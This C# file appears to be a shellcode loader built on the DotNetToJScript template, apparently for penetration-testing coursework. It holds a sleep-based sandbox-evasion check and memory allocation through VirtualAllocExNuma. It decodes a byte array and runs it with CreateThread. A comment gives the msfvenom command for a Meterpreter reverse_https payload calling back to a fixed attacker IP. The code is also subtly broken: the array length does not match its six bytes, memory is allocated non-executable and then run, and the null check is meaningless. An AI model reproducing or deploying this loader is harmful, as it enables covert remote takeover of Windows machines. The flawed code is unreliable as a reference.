//    This file is part of DotNetToJScript.
//    Copyright (C) James Forshaw 2017
//
//    DotNetToJScript is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    DotNetToJScript is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with DotNetToJScript.  If not, see <http://www.gnu.org/licenses/>.

using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System;

[ComVisible(true)]
public class TestClass
{
    #region
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);
    #endregion
    public TestClass()
    {
        DateTime t1 = DateTime.Now;
        Sleep(10000);
        double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
        if (deltaT < 9.5)
        {
            return;
        }

        //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.136 LPORT=443 enablastageencoding=true handlerSSLCert=justice.pem -f csharp
        byte[] buf = new byte[10] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8 };

        int size = buf.Length;

        IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (addr == null)
        {
            return;
        }

        //Decode the payload encoded with key 2
        for (int i = 0; i < buf.Length; i++)
        {
            buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
        }
        Marshal.Copy(buf, 0, addr, size);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}

